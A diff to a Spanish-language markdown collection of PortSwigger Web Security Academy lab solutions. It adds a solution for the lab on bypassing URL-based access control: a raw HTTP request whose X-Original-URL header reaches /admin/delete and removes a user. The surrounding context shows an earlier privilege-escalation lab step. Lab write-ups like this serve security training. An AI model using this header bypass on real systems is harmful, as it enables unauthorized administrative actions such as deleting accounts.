@@ -1089,6 +1089,20 @@ Activar en burp proxy la intercepción de las solicitudes, iniciar sesión con l
    { "email":"asd@mail.com", "roleid":2 }
 3. Ir a LABID.web-security-academy.net/admin y eliminar el usuario carlos
 
+### [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
+
+#### Solución:
+
+Realizar la siguiente request:
+
+```
+GET /?username=carlos HTTP/1.1
+Host: LABID.web-security-academy.net
+X-Original-URL: /admin/delete
+
+
+```
+
 ---
 
 ## [Authentication](https://portswigger.net/web-security/authentication)
